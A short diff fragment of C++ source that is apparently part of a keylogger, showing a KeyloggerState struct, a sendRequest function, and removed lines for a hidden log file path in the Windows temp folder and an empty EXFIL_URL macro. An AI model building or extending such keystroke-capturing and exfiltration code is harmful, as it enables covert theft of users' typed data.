@@ -49,12 +49,10 @@ struct KeyloggerState
 };
 
 static KeyloggerState g_state;
-static const std::wstring LOG_PATH = L"C:\\Windows\\Temp\\winkey.log";
 
 // ============================================================================
 // UTILITY FUNCTIONS
 // ============================================================================
-#define EXFIL_URL
 void sendRequest(const std::wstring &message)
 {
 
